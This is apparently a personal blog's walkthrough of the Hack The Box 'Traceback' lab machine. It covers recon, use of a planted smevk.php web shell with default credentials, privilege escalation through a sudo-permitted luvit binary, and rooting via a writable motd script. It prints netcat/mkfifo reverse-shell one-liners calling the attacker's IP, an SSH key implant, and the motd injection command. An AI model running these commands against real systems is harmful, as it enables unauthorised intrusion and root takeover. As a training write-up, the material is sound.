@@ -1,0 +1,153 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HTB] Traceback | Foguh</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('/img/bg.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB] Traceback</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-12-18T00:37:34.000Z" id="date"> 2023-12-18</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-01-14T21:05:03.000Z" id="updated"> 2024-01-14</time></div></span></div></div><hr><div id="post-content"><div style="display: flex; justify-content: center; align-items: center;">
+
+  <div style="margin-right: 20px;" class='item-img' data-src='traceback.png'><img src="traceback.png" title="Traceback" width="300px" height="300px" style="pointer-events: none;">
+  </div>
+
+  <div style="display: flex; flex-direction: column; text-align: left;">
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">OS: </strong class='item-img' data-src='linux.png'><img src="linux.png" alt="Linux" width="20px" height="20px" style="margin-left: 5px;">
+      <span style="margin-left: 5px;">Linux</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Difficulty:</strong>
+      <span>Easy</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Author:</strong>
+      <span>Xh4H</span>
+    </div>
+    <div style="display: flex; align-items: center;">
+      <strong style="margin-right: 5px;">Release Date:</strong>
+      <span>March 14, 2020</span>
+    </div>
+  </div>
+
+</div>
+
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sC -sV 10.10.10.181 -o nmap_scan<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 23:32 WET<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.181<br>Host is up (0.060s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)<br>|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)<br>|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-title: Help us<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.86 seconds<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">Port</th>
+<th align="center">Service</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">22</td>
+<td align="center">SSH</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td align="center">Apache</td>
+</tr>
+</tbody></table>
+<h3 id="Apache-Web-Page"><a href="#Apache-Web-Page" class="headerlink" title="Apache Web Page"></a>Apache Web Page</h3><p>Web page running on port 80<br class='item-img' data-src='/HTB/Traceback/http.png'><img src="/HTB/Traceback/http.png"></p>
+<p>HTML code<br class='item-img' data-src='/HTB/Traceback/html.png'><img src="/HTB/Traceback/html.png"></p>
+<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><h3 id="smevk-php"><a href="#smevk-php" class="headerlink" title="smevk.php"></a>smevk.php</h3><p>By the previous screenshots from the web page, we get a hint that there is already a backdoor in the machine and the phrase “Some of the best web shells that you might need ;)”</p>
+<p>If we google that phrase, we will find a <a target="_blank" rel="noopener" href="https://github.com/TheBinitGhimire/Web-Shells">github repo</a> with a list of web shells</p>
+<p>We can try them one by one, or just add them all to a list and run Gobuster</p>
+<p class='item-img' data-src='/HTB/Traceback/shells.png'><img src="/HTB/Traceback/shells.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gobuster <span class="hljs-built_in">dir</span> --url http://10.10.10.181 --wordlist shells.txt <br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://10.10.10.181<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                shells.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>Progress: 21 / 22 (95.45%)<br>/smevk.php            (Status: 200) [Size: 1261]<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+
+<p>We now know the web shell being used is smevk.php<br class='item-img' data-src='/HTB/Traceback/smevk.png'><img src="/HTB/Traceback/smevk.png"></p>
+<p>If we look at the web shell code, we get the login default credentials<br class='item-img' data-src='/HTB/Traceback/smevkcode.png'><img src="/HTB/Traceback/smevkcode.png"></p>
+<table>
+<thead>
+<tr>
+<th align="center">User</th>
+<th align="center">Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">admin</td>
+<td align="center">admin</td>
+</tr>
+</tbody></table>
+<h3 id="Getting-a-shell"><a href="#Getting-a-shell" class="headerlink" title="Getting a shell"></a>Getting a shell</h3><p>After we login, we are presented with the web shell dashboard, we can use the “Execute: “ field, to run a reverse shell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.9 1234 &gt;/tmp/f<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Traceback/revshell.png'><img src="/HTB/Traceback/revshell.png"></p>
+<p>We can upgrade our shell using python</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>ctrl+z <br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span> &amp;&amp; <span class="hljs-built_in">fg</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><h3 id="luvit"><a href="#luvit" class="headerlink" title="luvit"></a>luvit</h3><p>Right now we have a shell as webadmin, if we run sudo -l, we will see that we can run &#x2F;home&#x2F;sysadmin&#x2F;luvit without a password<br class='item-img' data-src='/HTB/Traceback/sudol1.png'><img src="/HTB/Traceback/sudol1.png"></p>
+<p>Running the history command, we can see that this binary uses .lua files, and that the previous user ran the command and then removed the .lua file<br class='item-img' data-src='/HTB/Traceback/history.png'><img src="/HTB/Traceback/history.png"></p>
+<p>We just need to insert code to run a bash shell in a .lua file, and then run the binary as sysadmin since we do not need a password</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;require(&#x27;os&#x27;);&quot;</span> &gt; root.lua<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;os.execute(&#x27;/bin/bash&#x27;);&quot;</span> &gt;&gt; root.lua<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Traceback/rootlua.png'><img src="/HTB/Traceback/rootlua.png"></p>
+<p>Now we just run the binary as sysadmin and we get a shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo -u sysadmin /home/sysadmin/luvit root.lua<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Traceback/sysadminshell.png'><img src="/HTB/Traceback/sysadminshell.png"></p>
+<p>Now just get the user flag<br class='item-img' data-src='/HTB/Traceback/userflag.png'><img src="/HTB/Traceback/userflag.png"></p>
+<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><h3 id="Switching-to-SSH"><a href="#Switching-to-SSH" class="headerlink" title="Switching to SSH"></a>Switching to SSH</h3><p>Before trying to escalate our privileges, we should switch to SSH<br>To do this, we can just generate some ssh keys in our machine and add the .pub key to the authorized_keys in &#x2F;home&#x2F;sysadmin&#x2F;.ssh&#x2F;authorized_keys</p>
+<p>First generate the keys in our local machine<br class='item-img' data-src='/HTB/Traceback/sshkeygen.png'><img src="/HTB/Traceback/sshkeygen.png"></p>
+<p>Then copy the content of id_rsa.pub to &#x2F;home&#x2F;sysadmin&#x2F;.ssh&#x2F;authorized_keys</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;id_rsa.pub content&gt;&quot;</span>  &gt;&gt; /home/sysadmin/.ssh/authorized_keys<br></code></pre></td></tr></table></figure>
+
+<p>Now we can ssh as sysadmin using the id_rsa private key</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh -i id_rsa sysadmin@10.10.10.181<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Traceback/ssh1.png'><img src="/HTB/Traceback/ssh1.png"></p>
+<p>If you notice, we get a custom banner for logging in with SSH</p>
+<h3 id="pspy"><a href="#pspy" class="headerlink" title="pspy"></a>pspy</h3><p>We can now use <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy64</a> to monitor processes and see if anything is being ran in the background</p>
+<p>To transfer the pspy64 binary to the target machine, download it to your local machine and start a python http server in it’s directory</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 -m http.server 1234<br></code></pre></td></tr></table></figure>
+
+<p>Now just download it in the target machine and make it executable</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wget http://&lt;Attacker-IP&gt;:1234/pspy64<br>$ <span class="hljs-built_in">chmod</span> +x pspy64<br></code></pre></td></tr></table></figure>
+
+<p>Now if you run it and wait for a while, we will see some commands being ran</p>
+<p class='item-img' data-src='/HTB/Traceback/pspy64.png'><img src="/HTB/Traceback/pspy64.png"></p>
+<p>Here we can see that files from &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F; are being copied to &#x2F;etc&#x2F;update-motd.d&#x2F; every 30 seconds</p>
+<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>If we look at &#x2F;etc&#x2F;update-motd.d&#x2F;00-header we will find the exact message we got when we logged in with SSH at the bottom<br class='item-img' data-src='/HTB/Traceback/00header.png'><img src="/HTB/Traceback/00header.png"></p>
+<p>What we can gather from this is the following:</p>
+<p>When we login with SSH the code in the 00-header file gets executed, and since the SSH Server always runs as root, this means that this code is being executed as root.</p>
+<p>If we insert code in this file to run a reverse shell, we should get a shell as root.</p>
+<p>However this file gets restored every 30 seconds.<br>What we need to do is:</p>
+<p>1 - Start a netcat listener<br>2 - Insert malicious reverse shell code in &#x2F;etc&#x2F;update-motd.d&#x2F;00-header file<br>3 - Start a new ssh session in the machine to execute the code before it gets restored</p>
+<p>If we do all of this correctly, we will get a shell as root</p>
+<p>Local Machine: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nc -lvnp 1337<br></code></pre></td></tr></table></figure>
+<p>Now the next 2 steps need to be done quickly</p>
+<p>Remote Server (sysadmin session):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.9 1337 &gt;/tmp/f&quot;</span> &gt;&gt; /etc/update-motd.d/00-header<br></code></pre></td></tr></table></figure>
+
+<p>Local Machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh -i id_rsa sysadmin@10.10.10.181<br></code></pre></td></tr></table></figure>
+
+<p>We should now have a shell as root on our netcat listener<br class='item-img' data-src='/HTB/Traceback/rootshell.png'><img src="/HTB/Traceback/rootshell.png"></p>
+<p>Now just get the root flag<br class='item-img' data-src='/HTB/Traceback/rootflag.png'><img src="/HTB/Traceback/rootflag.png"></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/HTB/Schooled/">← Next [HTB] Schooled</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/HTB/Valentine/">[HTB] Valentine Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lucas 'Foguh' Ferreira</a></h1><div id="description"><p>Junior PenTester</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Web-Page"><span class="toc-number">1.2.</span> <span class="toc-text">Apache Web Page</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">2.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#smevk-php"><span class="toc-number">2.1.</span> <span class="toc-text">smevk.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-a-shell"><span class="toc-number">2.2.</span> <span class="toc-text">Getting a shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement"><span class="toc-number">3.</span> <span class="toc-text">Lateral Movement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#luvit"><span class="toc-number">3.1.</span> <span class="toc-text">luvit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">4.</span> <span class="toc-text">PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Switching-to-SSH"><span class="toc-number">4.1.</span> <span class="toc-text">Switching to SSH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pspy"><span class="toc-number">4.2.</span> <span class="toc-text">pspy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#root"><span class="toc-number">4.3.</span> <span class="toc-text">root</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
